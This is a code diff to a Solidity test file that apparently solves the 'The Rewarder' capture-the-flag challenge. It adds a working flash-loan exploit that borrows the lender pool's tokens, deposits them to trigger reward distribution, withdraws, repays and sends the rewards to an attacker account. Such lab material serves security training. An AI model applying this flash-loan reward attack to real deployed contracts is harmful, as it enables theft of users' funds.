@@ -10,9 +10,13 @@ import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
 
+import {Address} from "openzeppelin-contracts/utils/Address.sol";
+
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
     uint256 internal constant USER_DEPOSIT = 100e18;
+    
+    using Address for address payable;
 
     Utilities internal utils;
     FlashLoanerPool internal flashLoanerPool;
@@ -84,10 +88,31 @@ contract TheRewarder is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
+    function receiveFlashLoan(uint256 amount) external {
+      dvt.approve(address(theRewarderPool), amount);
+      theRewarderPool.deposit(amount);
+      theRewarderPool.distributeRewards();
+      theRewarderPool.withdraw(amount);
+
+      // return back to loaner pool
+      dvt.transfer(address(flashLoanerPool), amount);
+    }
+
     function testExploit() public {
         /**
          * EXPLOIT START *
          */
+        vm.warp(block.timestamp + 5 days); // 5 days
+        flashLoanerPool.flashLoan(TOKENS_IN_LENDER_POOL);
+        theRewarderPool.rewardToken().transfer(
+          attacker, 
+          theRewarderPool.rewardToken().balanceOf(address(this))
+        );
+
+        vm.startPrank(attacker);
+        vm.stopPrank();
+
+
 
         /**
          * EXPLOIT END *
